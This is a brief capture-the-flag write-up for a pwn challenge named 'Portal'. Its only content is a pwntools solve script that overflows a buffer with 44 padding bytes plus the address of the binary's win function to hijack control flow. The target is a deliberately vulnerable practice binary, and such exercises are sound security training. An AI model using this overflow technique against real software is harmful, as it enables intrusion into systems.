# Portal

author: awesome10billion

category: pwn

## Solve script

solve.py
```python
from pwn import *

# Set up the context for the binary
context.binary = './portal'
context.log_level = 'debug'

elf = ELF('./portal')
# Start the process
p = process('./portal')
#p = remote('0.cloud.chals.io', 13188)
p.sendline(b'A'*44 + p64(elf.symbols.win))
p.interactive()
```